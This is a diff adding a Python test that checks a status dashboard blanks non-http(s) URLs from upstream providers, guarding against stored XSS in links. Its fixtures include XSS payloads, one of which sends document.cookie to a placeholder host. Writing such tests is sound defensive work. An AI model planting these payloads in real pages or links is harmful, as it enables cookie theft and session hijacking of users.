@@ -1179,6 +1179,59 @@ def test_upstream_deps_indicator_and_incident_filter(tmp_path, monkeypatch):
     store.close()
 
 
+def test_upstream_deps_rejects_non_http_urls(tmp_path, monkeypatch):
+    """外部 shortlink/status_url 必须经 http(s) scheme 白名单:javascript:/data: 一律抹成空。
+    否则上游被投毒的 shortlink 会落进 href 成可点击 XSS(autoescape 不拦 scheme)。"""
+    from sentinel.models import (
+        Incident,
+        IncidentStatus,
+        Indicator,
+        Snapshot,
+    )
+
+    settings = _settings(monkeypatch, SENTINEL_PROVIDERS="anthropic")
+    store = Store(str(tmp_path / "s.db"))
+    store.put(
+        "anthropic",
+        Snapshot(
+            provider="anthropic",
+            display_name="Anthropic",
+            indicator=Indicator.MAJOR,
+            status_url="javascript:alert(document.domain)",  # 投毒的 status_url
+            components=[],
+            incidents=[
+                Incident(
+                    key="bad",
+                    title="poisoned",
+                    status=IncidentStatus.INVESTIGATING,
+                    impact=Indicator.MAJOR,
+                    url="javascript:fetch('//x/'+document.cookie)",  # 投毒 shortlink
+                    started_at=None,
+                    updated_at=None,
+                    latest_update_id="u1",
+                ),
+                Incident(
+                    key="ok",
+                    title="legit",
+                    status=IncidentStatus.INVESTIGATING,
+                    impact=Indicator.MINOR,
+                    url="https://status.anthropic.com/incidents/abc",  # 合法
+                    started_at=None,
+                    updated_at=None,
+                    latest_update_id="u2",
+                ),
+            ],
+            fetched_at="2026-06-16T00:00:00Z",
+        ),
+    )
+    dep = view._upstream_deps(store, settings)[0]
+    assert dep["status_url"] == ""  # javascript: status_url 抹空
+    by_title = {i["title"]: i for i in dep["incidents"]}
+    assert by_title["poisoned"]["url"] == ""  # javascript: shortlink 抹空
+    assert by_title["legit"]["url"] == "https://status.anthropic.com/incidents/abc"  # https 保留
+    store.close()
+
+
 async def test_build_hygiene_shape_and_banner(tmp_path, monkeypatch):
     settings = _settings(monkeypatch)
     store = Store(str(tmp_path / "s.db"))
